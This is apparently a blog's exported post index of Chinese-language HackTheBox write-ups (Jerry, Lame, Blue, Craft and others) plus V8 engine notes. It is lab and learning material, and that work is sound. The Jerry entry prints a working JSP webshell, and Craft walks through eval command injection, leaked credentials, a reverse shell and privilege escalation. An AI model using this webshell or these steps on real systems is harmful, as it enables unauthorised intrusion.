669bd524d2a0ff37713ab80b4299cfe7ddd4c6ec061b209ecf7fa6f096918e2ae70bb174b61528252bb136d0138f52ae807a797e18f64326cd0340b4a45e6770740dd45195a79f8571eee738fddd0f228c7a7779087aa591a1c88117907ae47d68b3001e5deed42cbfaecd03b041f1b1aafcc875e2050a6ef886ef49bc7b4112efb75bd755af2d494f17f9ac0112cb197d1ea3b085df9c50093b595d70abe64bb0fbc60da65069314059841358ab24fdc87622b3bdfa17824e8054560bd469017a257054f6080931d9054ed27460f64bcc293d21eed1d9e2ccd83159d1edbc518ecb985741dbb8f58661a7155fb2e0d25417abbcfdf937eba5fc93e7b73526e2921ceae0dc19c2af649f65d630c323f160bdbce825823f1d702f6922d7a77b0f1d2c390d697fc3b5136769f846cb23bcd06819ea9f3c2c532e8bdbe345274b33235bf1b9ebebd37a0665e0ca0607e8a6e20993d42bbcb90edab8eafaec540a437ffb4a09e9dc732520a6911aa4bc0e533fe1c47c65a620065c2e82a79be28a26637425b529500224aad140a7e9302bd56e7c26005af29929a5a7c8724e102a4d6107bc8d4f928e826b4189a56aa0aeb743f0a972d3b6bd51bdf670e68930a69a153508579475fcb44511ad381473881e7f6c6015df8aa012cf446c7f8602c18e91c8e06ecf9439d0471579b47b475a33b24305d8033830f76039734b67608f4fd6b46e56a4c6ca4f8b1b319aecebca53aa1774fb0045a46174362fffe6782b27cf2c0c95817b2cae2819376dd06da461a1365f7668251e6235a74a1669eab37d6396a553a4945475808177b749f75413dc1504dda913f0100e35d6f5f349d172cec2d2c80f907d83e30963913957e0ce871594bff4482e335b96e7295dd2d0bb592322f79cd16dea82cd4f898fac1404de348c8003713fd7e8cc918dbe9d52da769648f6020837e77ede90c6a932ff3b02a8eb4271b2468eb8d2ba7340b26c26a9a9f8ebc961db0ee6d9348323fc1a7700b1507c656e151ca90cb361c2ade60a61b2ae0f065da3ca9b36a9ebcc58b07326072875b5395ffc1310672d73f19f2f108a1d1ec1858bebc7f71f471186497459b1af4bbee69c5927b610925869cdb0e30976a2624ae773454cefeb5b0878dd5f73bfe0c13f361a8e081d5bcf0e70fc5ddf0f008efbe26f4105caf4097541415f69b864d7a2f1e10704f25bac8649a042e5c2fe9090b521f7db3c26f9a96110287c2709e7097f76e3ea926df632fdf2e8fb7b665f1a08fd186d7bda23b3df4d395670aa186aa99ca0a96d8079e731a1ab9cf1d3765be2cf5b028625a8361d537267fa362ff5addea4c652503927ffbb936b1c1f26f12564521a58440f7e8847f1e673766efa57ce4ef7002a4e9b1702420aa38316ff4edd8c6f7496f1996ad4426aecdbd5e3affbf3d7b7542e8f9d292e2f0038a697ebe758f6e67911817f3a8ca12966955f42db869c42b77419dfd772d7117db14c6c8df6dfa0ad6abc66fe0062b49d87cea3fa76f3493fefb906448ac149b4fd1895c69f78397ca7de758696e4a34ceb8eeafaab41756ace3d99fb93cd08a247696cb41bdac01c4a96615db3fead3d1641cbe5ebc10fa6fab0eafa1a1dfde27bdd7c4e905f54bdca5591c07220892184b390879eb09ea73f86ec653ad94a43e26b94aa0f72f14832eb06db6045f226a98e5848ea23c809507b2593dd801c6a72ab5049cb360b825eaba941e4fe4c1e5b74ec13bbc86d3fc94d8cc379219de350af0cde0aad8f081d79a53f968ad5674207d2436b5848d4db2a3db574490cf3c1387ddc89d7f9bf12c5144a0a2e2f37c1b61ab5d14778dd89dc278d7cb865ab6b2741b680010db65af1360f66f531d88a78545bf34856b67e9baefbdbf113f36195ba7d85fa5d49146b2446aac0a676c9ed2ad344c8dee258c4ba83fc2ca4efe4a354cf10addea9d33c10ebb37ffd334fb9bb762691cdd903611a4cb5d8d7636877e42b1469d6aa5cde77bfd07d485c127407d4682e06034139","categories":[{"name":"Hacker101 CTF","slug":"Hacker101-CTF","permalink":"https://darkwing.moe/categories/Hacker101-CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"Jerry - HackTheBox","slug":"Jerry-HackTheBox","date":"2020-01-11T06:33:35.000Z","updated":"2020-11-05T06:43:01.723Z","comments":true,"path":"2020/01/11/Jerry-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/01/11/Jerry-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/144 10.10.10.95 端口扫描一个8080： 1234567891011121314$ nmap -sC -sV -Pn 10.10.10.95Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-05 14:01 CSTNmap scan report for 10.10.10.95Host is up (0.073s latency).Not shown: 999 filtered portsPORT STATE SERVICE VERSION8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1|_http-favicon: Apache Tomcat|_http-server-header: Apache-Coyote/1.1|_http-title: Apache Tomcat/7.0.88Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 23.58 seconds 8080tomcat，需要密码： tomcat爆破字典：https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt 401基础认证，直接burp加载字典做一个base64编码就可以，注意取消自动URL编码： 得到账号密码： 1tomcat:s3cret webshell就是进去直接上传war包部署，得到webshell： 直接是system权限： shell.jsp123456789101112&lt;% if(\"b\".equals(request.getParameter(\"pwd\")))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"&lt;pre&gt;\"); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(\"&lt;/pre&gt;\"); &#125;%&gt; reverse shell转换成reverse shell方便交互操作： flags这个是两个flag在同一个文件里： 参考资料 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt https://www.hackthebox.eu/home/machines/writeup/144 HackTheBox - Jerry - YouTubehttps://www.youtube.com/watch?v=PJeBIey8gc4&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Lame - HackTheBox","slug":"Lame-HackTheBox","date":"2020-01-10T05:42:42.000Z","updated":"2020-11-05T05:43:50.424Z","comments":true,"path":"2020/01/10/Lame-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/01/10/Lame-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/1 10.10.10.3 端口扫描1234567891011121314151617181920212223242526272829303132333435363738394041424344454647$ nmap -sC -sV -Pn 10.10.10.3Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-05 13:36 CSTNmap scan report for 10.10.10.3Host is up (0.072s latency).Not shown: 996 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.3.4|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst:| STAT:| FTP server status:| Connected to 10.10.14.7| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| vsFTPd 2.3.4 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)| ssh-hostkey:| 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)|_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 2h30m34s, deviation: 3h32m10s, median: 32s| smb-os-discovery:| OS: Unix (Samba 3.0.20-Debian)| Computer name: lame| NetBIOS computer name:| Domain name: hackthebox.gr| FQDN: lame.hackthebox.gr|_ System time: 2020-11-05T00:37:46-05:00| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_smb2-time: Protocol negotiation failed (SMB2)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 60.16 seconds Samba CVE-2007-2447HTB最初的靶机，就是exp直接一键打，这个用到的是CVE-2007-2447,直接打到root，读取flag： 1exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script 参考资料 CVE-2007-2447 Samba MS-RPC Shell命令注入漏洞-漏洞情报、漏洞详情、安全漏洞、CVE - 安全客，安全资讯平台https://www.anquanke.com/vul/id/1119744 https://www.hackthebox.eu/home/machines/writeup/1","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Blue - HackTheBox","slug":"Blue-HackTheBox","date":"2020-01-10T05:30:03.000Z","updated":"2020-11-05T05:30:53.531Z","comments":true,"path":"2020/01/10/Blue-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/01/10/Blue-HackTheBox/","excerpt":"","text":"基本信息开了会员做HTB Tracks，都是Retired Machines，writeup公开的很多 https://www.hackthebox.eu/home/machines/profile/51 10.10.10.40 端口扫描12345678910111213141516171819202122232425262728293031323334353637383940$ nmap -sC -sV 10.10.10.40Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-05 13:21 CSTNmap scan report for 10.10.10.40Host is up (0.069s latency).Not shown: 991 closed portsPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPC49157/tcp open msrpc Microsoft Windows RPCService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2s, deviation: 2s, median: 0s| smb-os-discovery:| OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)| OS CPE: cpe:/o:microsoft:windows_7::sp1:professional| Computer name: haris-PC| NetBIOS computer name: HARIS-PC\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2020-11-05T05:22:59+00:00| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2020-11-05T05:22:55|_ start_date: 2020-11-05T05:19:57Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 73.09 seconds ms17-010就是永恒之蓝，ms17-010直接打： flag然后直接shell读文件： 1234567C:\\Windows\\system32&gt;type c:\\Users\\haris\\Desktop\\user.txttype c:\\Users\\haris\\Desktop\\user.txt4c546aea7dbee75cbd71de245c8deea9C:\\Windows\\system32&gt;type c:\\Users\\Administrator\\Desktop\\root.txttype c:\\Users\\Administrator\\Desktop\\root.txtff548eb71e920ff6c08843ce9df4e717C:\\Windows\\system32&gt; 参考资料 https://www.hackthebox.eu/home/machines/writeup/51 HackTheBox - Blue - YouTubehttps://www.youtube.com/watch?v=YRsfX6DW10E&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"HackTheBox — Infiltration","slug":"HacktheBox-—-Infiltration","date":"2020-01-09T07:23:29.000Z","updated":"2020-04-23T06:29:38.134Z","comments":true,"path":"2020/01/09/HacktheBox-—-Infiltration/","link":"","permalink":"https://darkwing.moe/2020/01/09/HacktheBox-%E2%80%94-Infiltration/","excerpt":"","text":"基本信息 Can you find something to help you break into the company ‘Evil Corp LLC’. Recon social media sites to see if you can find any useful information. 在社交网络查找敏感信息 分析(预期)这道题作者是greenwolf，通过gitmemory能在他的Github一个项目insue里能够找到相关信息： https://www.gitmemory.com/Greenwolf https://github.com/Greenwolf/social_mapper/issues/112 其中ins上有趣的信息： https://www.instagram.com/eryn_mcmahon12/ https://www.instagram.com/p/BvbnFhTj9YS/ 模拟的场景是一个员工拍照上传，泄漏了敏感信息 flag就在她的badge上 Google(非预期)现在用Google搜索能直接搜到她的ins 参考资料 https://pastebin.com/Qt94BzZp https://www.gitmemory.com/Greenwolf https://github.com/Greenwolf/social_mapper/issues/112","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"HackTheBox — Easy Phish","slug":"HacktheBox-—-Easy-Phish","date":"2020-01-09T06:58:06.000Z","updated":"2020-04-23T06:29:09.811Z","comments":true,"path":"2020/01/09/HacktheBox-—-Easy-Phish/","link":"","permalink":"https://darkwing.moe/2020/01/09/HacktheBox-%E2%80%94-Easy-Phish/","excerpt":"","text":"基本信息 Customers of secure-startup.com have been recieving some very convincing phishing emails, can you figure out why? 邮件钓鱼相关的，那应该想到DNS中关于反垃圾钓鱼邮件的相关设置 SPFSPF是“发件人策略架构 Sender Policy Framework”的缩写，该系统可防止其他服务器代表您的域发送未经授权的电子邮件。在您的域的DNS表中使用TXT条目配置SPF，并在其中通知允许哪些服务器使用您的域发送电子邮件。收到电子邮件后，收件人的服务器将验证发送服务器是否实际上已被授权使用该域。如果服务器没有，则电子邮件被拒绝。 SPF会在Internet标头中检查用于发送邮件的SMTP（邮件服务器）是否在回答服务器域的IP列表中得到授权。它还会告诉您域是否授权该关系以外的其他IP代表您发送电子邮件。管理员按照（RFC 4408）的规则在DNS区域TXT条目上配置此接口。如果此系统处于活动状态，并且请求的IP与授权的IP不同，则电子邮件将被拒绝。 那么检查下SPF记录，能够得到一部分flag，证明思路是对的，其他部分应该在其他配置中： DKIMDKIM，电子邮件验证标准——域名密钥识别邮件标准。DomainKeys Identified Mail的缩写。 一般来说，发送方会在电子邮件的标头插入DKIM-Signature及电子签名资讯。而接收方则透过DNS查询得到公钥后进行验证。 不过针对这个题目，并没有用到DKIM DMARCDMARC是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，在邮件收发双方建立了邮件反馈机制，便于邮件发送方和邮件接收方共同对域名的管理进行完善和监督。 DMARC要求域名所有者在DNS记录中设置SPF记录和DKIM记录，并明确声明对验证失败邮件的处理策略。邮件接收方接收邮件时，首先通过DNS获取DMARC记录，再对邮件来源进行SPF验证和DKIM验证，对验证失败的邮件根据DMARC记录进行处理，并将处理结果反馈给发送方。 DMARC能够有效识别并拦截欺诈邮件和钓鱼邮件，保障用户个人信息安全。 DMARC在发件人策略框架（SPF）和域密钥标识的邮件（DKIM）协议中添加了一个策略层。SPF协议可与DNS配置一起使用。然后，在配置它时，发送方会通知已授权给定的IP地址使用该域发送消息。 DKIM协议与公钥加密一起使用。这意味着，通过使用该协议发送消息，接收者能够识别该密钥确实属于发送者。最后，当DMARC遇到与电子邮件的任何不一致时，它会使用这两种协议来执行一系列安全措施。 那就检查下DMARC，得到另一部分flag： 参考资料 https://medium.com/@maximilianomeyer1/hint-customers-of-secure-startup-com-1d4591537ff7 http://www.ciotimes.com/InfoSecurity/158336.html","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"HackTheBox — Craft","slug":"HacktheBox-—-Craft","date":"2020-01-08T06:17:50.000Z","updated":"2020-04-23T06:28:23.183Z","comments":true,"path":"2020/01/08/HacktheBox-—-Craft/","link":"","permalink":"https://darkwing.moe/2020/01/08/HacktheBox-%E2%80%94-Craft/","excerpt":"","text":"基本信息Lab地址：https://www.hackthebox.eu/home/machines/profile/197 10.10.10.110 端口扫描首先nmap全端口扫描： 1nmap -p- 10.10.10.110 这一步会比较耗时，耐心等待结果： 服务信息接下来针对这几个端口进一步扫描服务信息： 1nmap -p 22,443,6022 -sV -sC 10.10.10.110 得到结果： 123456789101112131415161718192021222324252627PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)| ssh-hostkey:| 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)| 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)|_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)443/tcp open ssl/http nginx 1.15.8|_http-server-header: nginx/1.15.8|_http-title: About| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US| Not valid before: 2019-02-06T02:25:47|_Not valid after: 2020-06-20T02:25:47|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1| tls-nextprotoneg:|_ http/1.16022/tcp open ssh (protocol 2.0)| fingerprint-strings:| NULL:|_ SSH-2.0-Go| ssh-hostkey:|_ 2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port6022-TCP:V=7.80%I=7%D=1/7%Time=5E142311%P=x86_64-apple-darwin18.6.0SF:%r(NULL,C,\"SSH-2\\.0-Go\\r\\n\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 其中443端口的ssl证书信息显示域名为craft.htb,可以先把它添加到hosts里： 110.10.10.110 craft.htb 直接访问443端口的web会有个警告信息，直接信任就可以 子域名craft.htb的Web界面信息显示可以通过REST API访问，直接点击API会出错，因为这是一个子域名，api.craft.htb/api/ API右边的Logo是子域名 gogs.craft.htb，直接点击访问同样失败，看起来是用了Virtual Hosting，我们修改hosts，将这几个域名都加进去： 110.10.10.110 craft.htb api.craft.htb gogs.craft.htb 然后我们再次访问这两个子域名，在信任证书后可以正常显示： Craft API Craft Gogs APIAPI打开是swagger-ui，给出了一些API接口格式信息，看起来有用的是check, login, 和brew这几个 123456789GET &#x2F;auth&#x2F;checkChecks validity of an authorization tokenURL: https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;auth&#x2F;checkGET &#x2F;auth&#x2F;loginCreate an authentication token provided valid username and passwordURL: https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;auth&#x2F;loginPOST &#x2F;brew&#x2F;Creates a new brew entryURL: https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;brew&#x2F; 尝试auth login ： 看起来是401基础认证，尝试简单用户名密码失败，响应如下： 响应头中有一个www-authenticate，看起来如果认证成功会得到一个token，另外检查/auth/check和/brew也可以根据相应信息确定，需要提供有效token： Gogs因为Gogs看起来是Git服务器，我们尝试进行目录爆破： 1python3 dirmap.py -i https://gogs.craft.htb/ -lcf 得到如下结果： 12345678[200][text/html; charset=UTF-8][7.04kb] https://gogs.craft.htb/Administrator[200][text/html; charset=UTF-8][7.04kb] https://gogs.craft.htb/administrator[200][text/html; charset=UTF-8][7.04kb] https://gogs.craft.htb/Administrator/[200][text/html; charset=UTF-8][7.04kb] https://gogs.craft.htb/administrator/[200][text/plain; charset=utf-8][27.34kb] https://gogs.craft.htb/config.codekit[200][text/html; charset=utf-8][160.00b] https://gogs.craft.htb/debug[200][text/html; charset=utf-8][160.00b] https://gogs.craft.htb/debug/[200][text/html; charset=UTF-8][6.83kb] https://gogs.craft.htb/user/login/ 尝试访问/administrator： 在explore中可以发现一个craft-api的repo： 并且能够看到4个用户，administrator之外其他三个用户名是美剧《硅谷》中的角色： 代码信息接下来翻一下repo中的代码 dbtest.py是一个测试数据库连接的脚本，并且有一个测试sql query： test.py中是对API的测试，可以看到认证成功后得到token，之后使用X-Craft-API-Token请求头使用其他API： auth.py是认证需要的一些信息和认证处理流程： 命令注入漏洞继续翻其他文件，brew.py里这段代码很有趣，使用了eval，可能的命令注入： 在issue中有一个相关问题： 点进去可以发现eval是这次commit加进去的： 修复一个bug产生一个新漏洞，但利用这个eval的前提是要有有效认证信息 commit log 泄漏信息转去看commit历史 可以看到第四次提交add test script，第五次是Cleanup test，这里泄漏了认证信息： 1dinesh:4aUh0A8PbVJxgd 有效认证然后，我们就可以使用dinesh的用户名和密码登录Gogs: 也可以使用同样的用户名密码使用API认证得到有效token： 也可以添加X-Craft-Api-Token请求头检查token，确认token有效： 利用命令注入我们现在有有效token，就可以尝试利用/api/brew，在前面的脚本中我们也已经知道了相关请求格式，那么就可以进行测试： 正常的输入处理逻辑如上，但前面也注意到了，这里处理直接使用的eval，可能命令注入： 123456# make sure the ABV value is sane. if eval('%s &gt; 1' % request.json['abv']): return \"ABV must be a decimal value less than 1.0\", 400 else: create_brew(request.json) return None, 201 我们可以打开Python简单测试下： 可以看到这样的代码本地是可以进行命令注入的，接下来就进行下实际验证： 反弹shell可以成功执行命令，接下来尝试反弹shell： 可以成功getshell，root权限 因为这是一个哑shell，想把它变成一个交互shell，但常规方式失败： 检查之后发现现在是在一个docker容器里： 那就扫描下docker这个网段： 1for ip in $(seq 1 254); do (ping -c 1 172.20.0.$ip | grep \"bytes from\" | cut -d \":\" -f1 | cut -d \" \" -f4 &amp;); done 配置文件但好像没什么有用信息,那就还从app本身文件入手： 可以看到这里有一个settings.py文件，前面的Gogs中没有这个文件 在settings.py中，我们可以得到CRAFT_API_SECRET和数据库相关信息： dump db另外dbtest.py直接使用相关信息测试查询数据库，我们可以尝试修改其中的sql query获取信息,不过因为是哑shell，所以需要本地修改好之后传过去，另外没有curl，但可以使用wget： 在modules.py中可以得到数据库结构信息： 修改sql获取所有user信息： 123[&#123;&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;&#125;, &#123;&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;&#125;, &#123;&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;&#125;] 有效账号尝试使用这些信息SSH连接22和 6022端口，均失败 尝试登录Gogs，gilfoyle的信息可用 SSH可以看到一个craft-infra的repo： 并且在 .ssh目录可以得到ssh密钥： 然后就可以用这个私钥以gilfoyle的身份登录SSH，可能会要求输入密码，就是gilfoyle用户的密码： user.txt现在可以得到user flag： vault查看下文件，发现有个.vault-token文件： 简单搜了下，这应该是Hashicorp的Vault ，一种用于在现代应用程序体系结构中安全地管理机密信息的流行工具。 https://www.jianshu.com/p/019a9eb51ae6 https://github.com/hashicorp/vault https://www.vaultproject.io/docs/commands/ 并且前面的craft-infra中也有vault的相关文件： 可以看到vault secrets enable ssh 根据文档查看下token相关信息： 显示capabilities是root，并且前面看到enable ssh，那么尝试ssh： password就是他给的session，成功获得root shell root.txt得到root flag： 并且确认6022端口是前面的docker 以上 参考资料 https://medium.com/bugbountywriteup/hackthebox-craft-bf892b02fb90 https://youtu.be/3znkLWakuUA","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"V8的优化机制","slug":"V8的优化机制","date":"2019-12-27T05:45:18.000Z","updated":"2019-12-27T05:46:19.817Z","comments":true,"path":"2019/12/27/V8的优化机制/","link":"","permalink":"https://darkwing.moe/2019/12/27/V8%E7%9A%84%E4%BC%98%E5%8C%96%E6%9C%BA%E5%88%B6/","excerpt":"","text":"优化 Full-Codegen生成的机器代码(半优化代码)的特点 生成速度快，运行速度慢(浪费较多) 因此，出现了根据需要进行优化的机制 优化1: 利用类型信息缓存 利用Hidden Class的信息，Inline Caching 缓存调用的地址和引用的偏移量 优化2: 重新编译为更高效的JIT代码 运行时判定优化对象 主线程中，正常运行机器代码 其他线程中，Runtime-Profiler测定利用情况 Runtime-Profiler：程序运行时，进行测定，统计的机制 基于测定结果，判定是否进行优化 使用Crankshaft优化编译 再次讲源代码编译为机器代码，替换运行中的机器代码 使用TurboFan优化编译 再次讲源代码编译为机器代码，替换运行中的机器代码 优化的线程关系运行时的关系大概是这样： 2018年现在的关系大概这样： 2. Hidden ClassJavascript中，Object有property，例如这个例子中，使用函数来实现class，其中有x和y属性，被称为property： V8通过调用Hidden Class的机制来实现对property的访问 为了高效访问property 对property访问的实现 一般使用hash table比较多，效率很差 直接实现hash table的话，会增加没有使用的浪费掉的区域 hash冲突情况的处理，管理区域复杂化，也是问题 hash table和后面要讲的Inline caching的相性不是很好 因此需要比hash table更高效的搜索property的机制 property的实现 property的值以数组形式进行管理 通过偏移值来访问数组中的property值 offset另外管理 property名称与偏移量的依赖关系交给别的class(Map) 这个Map被称为Hidden Class Map Object生成时(还没有property时)，obj1内部指向C0 创建一个没有任何property，用于管理类型和offset的MAP(一般叫C0) 当添加obj1.x时，obj1内部改为指向C1 C0中添加x的offset信息，生成新的Map C1(Map也有类型信息) C0中添加转移条件(Map transition) Map C0条件：当x加入时转移到C1 当访问obj1.x的值时，跟踪obj1所持有的指针，引用C1,获得”x的偏移量为0”的信息。之后，通过访问obj1的偏移量0处的值，可以高速的获得x的值。在C1内部，有必要寻找”x”，尽管我个人觉得它与哈希表似乎没有多大区别，但是这会让它速度更快。 当添加obj1.y时，obj1内部改为指向C2 C1中添加y的offset信息，生成新的Map C2 C1中添加转移条件 Map C1 条件：当y加入时转换到C2 C0和C1这时候已经不使用了，但后面可能还会用到，随意不会被移除。 Map复用会存在完全相同property的Object，他们也会有x和y，所以复用生成的Map 创建obj2时指向C0，通过与obj1相同的方式按x和y的顺序添加property，它顺着转换条件以完成C0-&gt;C1-&gt;C2 注意：具有相同名称的property的object，如果property的添加循序不同，那么也会具有不同的转换条件。 因此，最终创建的map也会变成不同的map，也就无法享受到获得加速的好处。有关详细信息，请参阅http://richardartoul.github.io/jekyll/update/2015/04/26/hidden-classes.html另外，如果property添加/删除次数增加太多，Hidden Class的管理会减慢。因此，这种情况不使用Hidden Class，而使用字典类型来管理https://v8project.blogspot.jp/2017/08/fast-properties.html property管理方式 默认情况下，property在object内部通过数组管理 In-Object property property增加(超过11个)时，也会使用object外部的数组 Fast property 进一步增加property的话，会使用object外部的字典管理 Slow/dict property 不使用Map，通过外部字典保存所有信息，也别叫做self-contained 实体是一个FixedArray的数组，但用法类似下土这种字典 参考：https://v8project.blogspot.jp/2017/08/fast-properties.html 这里想说的 (javascript的)object中有指向Map的指针 后面会说，object开头8个字节是指向Map的指针 (javascript的)object指向的Map，会根据情况快速改变 也就是说，在exploit中，这不是一个能够稳定利用的指针 类型相同 = Map的地址相同 通过比较Map的地址，可以确定类型的一致性 3. Inline Caching参考： https://blog.ghaiklor.com/optimizations-tricks-in-v8-d284b6c8b183 https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine https://www.slideshare.net/ssuser6f246f/v8-javascript-engine-for http://cs.au.dk/~jmi/VM/IC-V8.pdf 针对各种action，对类型进行缓存优化的机制这里说的action，大概是这些： 引用，代入(LoadIC, StoreIC) 数组访问(KeyedLoadIC, KeyedStoreIC) 二项运算(BinaryOpIC) # 最近的V8中好像去掉了？ 函数调用(CallIC) 比较(CompareIC) 布尔化(ToBooleanIC) # 最近的V8中好像去掉了？ 要考虑到某些action的JIT代码被多次调用 循环和函数之类的，多次传递相同的JIT代码 执行JIT代码时，关注操作对象（≒参数）的类型 JIT代码，有较高的可能性和上次时同样类型的操作 例如下面的Javascript代码，明显是重复相同类型的操作 对应到JIT代码，也同样成立 JavaScript类型,等价于map地址 从 Hidden Class的实现可以知道，同样类型的话，Map地址也是相同的 对类型进行缓存，也就是将map地址嵌入到JIT code中 例如对obj.x进行引用(Load)的IC，大概是这样： x的offset也一起缓存 当Map匹配时，通过x的offset得到property x，然后返回 实际上会有多个Map注册的情况，因此进行函数化 IC持有State UNINITIALIZED(0): 未初始化 PREMONOMORPHIC(.): 当前只被执行过一次，还没进行IC MONOMORPHIC(1): 只注册一个IC的情况(快速) POLYMORPHIC(P): 注册多个IC的情况(一般速度) MEGAMORPHIC(N): 注册很多个IC的情况(慢速) GENERIC(G): IC已停止的状态 括号里是后面说的debug输出（–trace-ic）的省略的标注 基本上是按照从上到下(0-&gt;.-&gt;1-&gt;P-&gt;N-&gt;G)的顺序迁移 CallIC之类的，是直接0-&gt;1 Inline Caching，可以使用–trace-ic确认 –use-ic使IC有效化(默认)，–no-use-ic使IC无效 关于Inline Caching对前面的总结： 与Hidden Class配对，对高速化做出巨大贡献 对于exploit，只需要关注地址和偏移在JIT中的缓存 创建任意地址读写的原语比较难，因此与exploit的相性不好 但是，某些情况下，IC执行的部分检查（例如边界检查）被部分简化 也就存在在非IC下不会引发的漏洞可能会在IC下触发","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[]},{"title":"V8 Baseline编译器：Full-Codegen","slug":"V8-Baseline编译器：Full-Codegen","date":"2019-12-16T06:59:50.000Z","updated":"2019-12-16T07:00:43.030Z","comments":true,"path":"2019/12/16/V8-Baseline编译器：Full-Codegen/","link":"","permalink":"https://darkwing.moe/2019/12/16/V8-Baseline%E7%BC%96%E8%AF%91%E5%99%A8%EF%BC%9AFull-Codegen/","excerpt":"","text":"Full-CodegenFull-Codegen存在的功能 将AST转换为汇编代码 作为JIT(Just in time)编译器 JIT编译器：在软件运行时执行编译，提高运行速度的机制 V8使用它，将要执行的Javascript代码转换为机器语言 输出的机器代码位于JIT区域(=RWX区域) EIP寄存器移到这个区域，然后执行 